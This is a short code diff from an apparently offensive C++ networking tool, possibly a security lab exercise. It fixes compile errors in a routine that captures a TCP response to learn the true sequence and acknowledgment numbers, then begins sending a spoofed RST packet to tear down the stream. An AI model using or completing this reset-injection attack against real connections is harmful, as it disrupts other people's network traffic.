@@ -73,18 +73,17 @@ int main(int argc, char **argv) {
 
   // Check response for correct seqno, ack
   std::optional<TCPPacket> response = config.topology.interface.receive(
-      [&spoofed_to_attacker](const TCPPacket &pkt) -> bool {
+      [](const TCPPacket &pkt) -> bool {
         // Ignore reset packets
-        if (pkt.rst)
-          return false;
+        return !pkt.rst;
       },
       config.timeout);
   
   if (!response.has_value()) {
     std::cout << "Error in evicting connection." << std::endl;
   } else {
-    uint32_t true_seqno = response.seqno;
-    uint32_t true_ackno = response.ackno;
+    uint32_t true_seqno = response->seqno;
+    uint32_t true_ackno = response->ackno.value();
 
     // DDOS stream by sending RST with correct seqno
     send_pkt(config, TCPPacket{
